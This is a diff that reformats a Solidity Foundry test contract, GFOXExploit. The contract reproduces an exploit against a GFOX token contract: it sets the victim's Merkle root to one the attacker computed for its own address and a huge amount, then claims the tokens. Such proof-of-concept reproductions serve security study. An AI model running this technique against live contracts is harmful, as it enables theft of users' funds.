@@ -21,7 +21,9 @@ import "forge-std/console.sol";
 pragma solidity ^0.8.0;
 
 interface IVictim {
-    function setMerkleRoot(bytes32 _merkleRoot) external;
+    function setMerkleRoot(
+        bytes32 _merkleRoot
+    ) external;
 
     function claim(address to, uint256 amount, bytes32[] calldata proof) external;
 }
@@ -46,7 +48,7 @@ contract GFOXExploit is Test {
     function testExploit() external balanceLog {
         //implement exploit code here
         // the amount of GFOX to be transferred
-        uint256 amount = 1780453099185000000000000000;
+        uint256 amount = 1_780_453_099_185_000_000_000_000_000;
         // set the merkle root
         bytes32 root = _merkleRoot(address(this), amount);
         victim.setMerkleRoot(root);
@@ -58,7 +60,9 @@ contract GFOXExploit is Test {
         return keccak256(abi.encodePacked(to, amount));
     }
 
-    function getBalance(IERC20 token) private view returns (uint256) {
+    function getBalance(
+        IERC20 token
+    ) private view returns (uint256) {
         return token.balanceOf(address(this));
     }
 }
